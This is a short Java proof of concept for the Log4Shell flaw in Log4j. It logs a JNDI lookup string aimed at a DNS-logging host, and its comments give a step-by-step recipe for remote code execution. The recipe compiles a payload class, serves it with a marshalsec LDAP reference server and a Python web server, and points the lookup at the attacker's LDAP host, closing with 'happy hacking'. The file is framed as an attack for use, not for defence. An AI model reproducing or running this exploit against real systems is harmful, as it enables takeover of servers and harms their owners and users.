import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class DNSLOG {
    private static final Logger logger = LogManager.getLogger(foo.class);
    public static void main(String[] args){
        logger.error("${jndi:ldap://6139b078.dns.1433.eu.org./xxx}");//UR DNSLOG PALTFORM
    }
    private static class foo{
    }
}
//RCE:
//1.Compile A hacker.java to hacker.class via javac
//javac hacker.java
//you can copy hacker.java from:
//https://github.com/chenlvtang/JavaUnserialization/blob/chenlvtang/JNDI-Exp_RMI/payload/hacker.java

//2.Start A LDAP servet via mashalsec
//java -cp ./marshalsec.jar marshalsec.jndi.LDAPRefServer http://UrIP/#hacker

//3.Chose A dir && Start A Web server via python
//python3 -m http.server 80

//4.put the hacker.class in the directory of the Web

//5.change the payload to ${jndi:ldap://yourLADPServerIp:port/xxx}

//6.happy hacking